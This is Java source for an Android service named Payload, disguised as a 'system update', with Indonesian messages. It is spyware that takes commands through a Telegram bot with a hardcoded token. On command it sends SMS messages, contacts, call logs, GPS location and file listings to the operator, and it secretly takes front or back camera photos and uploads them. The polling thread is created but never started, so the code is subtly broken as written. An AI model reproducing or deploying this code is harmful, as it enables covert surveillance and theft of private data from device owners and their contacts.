package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.net.Uri;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.os.Environment;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.TimeUnit;

public class Payload extends Service {
    // ── TOKEN BOT BARU KAMU ──
    private String BOT_TOKEN = "9163541732:AAHrGKUwIuEQ8OQOextL9deMJVWh6sSIqlw"; 
    private String CHAT_ID = "8598136412";
    
    private volatile boolean isRunning = true;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("SystemUpdate", "Service started...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = in.readLine()) != null) { response.append(line); }
                        in.close();

                        String jsonResponse = response.toString();
                        
                        if (jsonResponse.contains("\"update_id\":")) {
                            int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
                            int endIdx = jsonResponse.indexOf(",", startIdx);
                            if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                            lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
                        }
                        
                        if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
                            sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
                        } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
                            sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
                        } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
                            sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
                        } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
                            takePhoto(1);
                        } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
                            takePhoto(0);
                        } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
                            sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
                        } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
                            sendTelegramMessage("📂 *Isi Folder /storage/emulated/0/ (10 Teratas):*\n" + listFiles("/storage/emulated/0/"));
                        }

                    } catch (Exception e) { e.printStackTrace(); }
                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); }
                }
            }
        });
        return START_STICKY;
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address"))).append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca SMS."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada SMS.";
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 30; i++) {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Kontak."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Kontak.";
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Call Log."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
            }
        } catch (Exception e) { return "Gagal ambil lokasi."; }
        return "Lokasi tidak tersedia (GPS mati).";
    }

    private String listFiles(String path) {
        StringBuilder sb = new StringBuilder();
        try {
            File dir = new File(path);
            File[] files = dir.listFiles();
            if (files != null) {
                for (int i = 0; i < files.length && i < 10; i++) {
                    sb.append(files[i].getName()).append("\n");
                }
            }
        } catch (Exception e) { return "Gagal baca file."; }
        return sb.length() > 0 ? sb.toString() : "Folder kosong.";
    }

    private void takePhoto(int cameraId) {
        try {
            Camera camera = Camera.open(cameraId);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        camera.release();
                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera " + (cameraId == 1 ? "Depan" : "Belakang"));
                    } catch (Exception e) { e.printStackTrace(); }
                }
            });
        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
    }

    private void sendTelegramMessage(String pesan) {
        try {
            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
        String boundary = "*****";
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            
            request.writeBytes("--" + boundary + "\r\n");
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            request.writeBytes(CHAT_ID + "\r\n");
            
            if (caption != null) {
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                request.writeBytes(caption + "\r\n");
            }
            
            request.writeBytes("--" + boundary + "\r\n");
            request.writeBytes("Content-Disposition: form-data; name=\"" + (isPhoto ? "photo" : "document") + "\"; filename=\"" + file.getName() + "\"\r\n");
            request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                request.write(buffer, 0, bytesRead);
            }
            fis.close();
            
            request.writeBytes("\r\n--" + boundary + "--\r\n");
            request.flush();
            request.close();
            
            conn.getResponseCode();
            file.delete();
            
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
